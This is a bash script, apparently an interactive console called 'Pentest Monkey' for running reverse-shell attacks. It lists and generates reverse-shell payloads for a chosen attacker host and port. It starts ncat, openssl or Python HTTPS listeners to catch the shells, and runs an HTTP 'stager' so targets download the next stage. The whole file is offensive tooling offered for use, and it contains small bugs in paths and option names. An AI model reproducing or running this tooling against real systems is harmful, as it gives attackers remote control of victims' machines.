#!/bin/bash
set -m


#---------------#---------#  
W='\033[0m'  # White   #
R='\033[0;31m' # Red     #
G='\033[0;32m' # Green   #
O='\033[0;33m' # Orange  #
B='\033[0;34m' # Blue    #
P='\033[0;35m' # Purple  #
C='\033[0;36m' # Cyan    #
M='\033[0;35m' # Magenta #
Y='\033[0;33m' # Yellow  #
#---------------#---------#


set_listener(){
	printf "\nName\t\tcommand\n"
	echo ------------------------
	printf "netcat tcp:\tncat\n"
	printf "openssl:\topenssl\n"
	printf "netcat SSL:\tncat_ssl\n"
	printf "https(python):\tpython_https\n\n"
	read -p "LISTENER: " listener
	if [[ "$listener" = "ncat_ssl" ]]
	then
		listener_script="NCat_SSL_Server.sh"
		
	elif [[ "$listener" = "ncat" ]]
	then
		listener_script="NCat_Server.sh"
	elif [[ "$listener" = "openssl" ]]
	then
		listener_script="OpenSSL_Server.sh"
	elif [[ "$listener" = "python_http" ]]
	then
		listener_script="https_server.py"
	fi
}

run_listener(){
	echo -e "$G[+]$W Running listener on port $lport..."
	if [[ "$listener" =~ "python_https" ]]
	then
		read -p "Server Key: " serverkey
		read -p "Server Cert: " servercert
		sudo gnome-terminal -- python3 https_server.py --lhost $lhost --lport $lport --rhost $rhost --serverkey $serverkey --servercert $servercert
	else
		gnome-terminal --title=🐵Listener-$lport🐵 -- /bin/bash $listener_script $lport
	fi
}

kill_listener(){
	kill $(ps | grep $listener | cut -d ' ' -f1)
}

run_stager(){
	echo -e "$G[+]$W Running stager on port 13378..."
	if [[ "$payload" =~ ".cs" ]]
	then
		cd payloadss/C#
	elif [[ "$payload" =~ ".py" ]]
	then
		cd payloads/python
	elif [[ "$payload" =~ ".bat" || "$payload" =~ ".ps1" ]]
	then
		cd payloads/windows
	elif [[ "$payload" =~ ".sh" ]]
	then
		cd payloads/linux
	elif [[ "$payload" =~ ".go" ]]
	then
		cd payloads/Go
	elif [[ "$payload" =~ ".rb" ]]
	then
		cd payloads/ruby
	elif [[ "$payload" =~ ".pl" ]]
	then
		cd payloads/Perl
	else
		cd payloads/C
	fi
	python -m SimpleHTTPServer 13378 &
	sleep 1
	cd ../../
	pwd
	#gnome-terminal --title=🐵Stager🐵 -- python -m SimpleHTTPServer 13378 &
}


set_payload(){
	ls | tr ' ' '\n' | grep reverse > payloads.txt
	printf "\tReverse Shell\n\n"
	printf "\nNo.\tName\n"
	echo ------------------------
	cat payloads.txt -n
	echo
	read -p "PAYLOAD No.: " choice
	payload=$(cat payloads.txt | head -n $choice | tail -n 1)	
	rm payloads.txt
}

generate_payload(){
	if [[ $lhost = "" || $lport = "" ]]
	then
		echo "[!] Arguments not set; check lhost and lport...."
		show_set
	else
		./generate_shell_payload.sh $payload $lhost $lport
	fi
}

show_set(){
	printf "\t\tOptions\n\n"
	printf "Var\t\tVal\n"
	echo ------------------------
	printf "LISTENER:\t$listener\n"
	printf "LHOST:\t\t$lhost\n"
	printf "RHOST:\t\t$rhost\n"
	printf "LPORT:\t\t$lport\n"
	printf "PAYLOAD:\t$payload\n\n"
}

show_options(){
	printf "\tSHOW\n"
	printf "show listener\t:\tShows the type of listener for reverse shell connections\n"
	printf "show payload\t:\tShows the type of reverse shell payload set\n"
	printf "show port\t:\tShows what port is set for the listener\n"
	printf "show rhost\t:\tShows what target host ip has been set\n"
	printf "show set\t:\tShows all of the arguments set\n\n"
	printf "\tSET\n"
	printf "set listener\t:\tSets the type of listener for reverse shell connections\n"
	printf "set payload\t:\tsets the type of reverse shell payload set\n"
	printf "set port\t:\tsets what port is set for the listener\n"
	printf "set rhost\t:\tsets what target host ip has been set\n\n"
	printf "\tMISC\n"
	printf "run listener\t:\tRun the listener that has been using the port number\n"
	printf "run stager\t:\tThis runs a stager server to have the target download \n\t\t\tthe next stage of the exploit\n\n"
}


echo "[+] Pentest Monkey..."

while true
do
	printf $C"(Pentest 🐵 Monkey) $W>>  \b" 
	read -e cmd
	if [[ "$cmd" = "show listener" ]]
	then
		echo "Listener: " $listener
	elif [[ "$cmd" = "set listener" ]]
	then
		set_listener
	elif [[ "$cmd" = "set payload" ]]
	then
		set_payload
	elif [[ "$cmd" = "generate payload" ]]
	then
		generate_payload
	elif [[ "$cmd" = "show payload" ]]
	then
		echo "PAYLOAD: " $payload
	elif [[ "$cmd" = "set lport" ]]
	then
		read -p "LPORT: " lport
	elif [[ "$cmd" = "set lhost" ]]
	then
		read -p "LHOST: " lhost
	elif [[ "$cmd" = "set rhost" ]]
	then
		read -p "RHOST: " rhost
	elif [[ "$cmd" = "show set" ]]
	then
		show_set
	elif [[ "$cmd" = "show options" ]]
	then
		show_options
	elif [[ "$cmd" = "run listener" ]]
	then
		run_listener
	elif [[ "$cmd" = "run stager" ]]
	then
		run_stager
	else
		$cmd
	fi
done
